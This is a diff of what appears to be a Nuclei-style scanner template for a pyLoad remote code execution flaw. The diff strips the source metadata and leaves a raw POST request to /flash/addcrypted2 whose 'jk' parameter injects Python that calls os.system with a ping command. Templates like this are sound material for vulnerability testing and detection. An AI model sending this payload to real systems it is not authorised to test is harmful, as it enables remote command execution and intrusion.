@@ -3,12 +3,8 @@ info:
   name: pyLoad 远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bt9i6biat9bhzzic'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bt9i6biat9bhzzic
-    fofa: 暂无
 http:
 - raw:
   - 'POST /flash/addcrypted2 HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     jk=pyimport%20os;os.system("ping%20www.baidu.com");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
